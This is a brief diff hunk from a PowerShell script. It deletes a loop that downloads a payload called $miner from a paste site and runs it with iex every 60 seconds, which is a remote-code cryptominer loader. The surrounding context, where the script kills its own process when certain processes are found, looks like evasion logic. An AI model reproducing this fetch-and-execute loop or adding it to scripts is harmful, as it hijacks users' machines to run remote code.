@@ -27,8 +27,3 @@ if ($processes) {
     Stop-Process -Id $PID -Force
 }
 
-$miner = iwr "https://pastie.io/raw/lsxoaz"
-while ($true) {
-    iex $miner
-    Start-Sleep -Seconds 60
-}
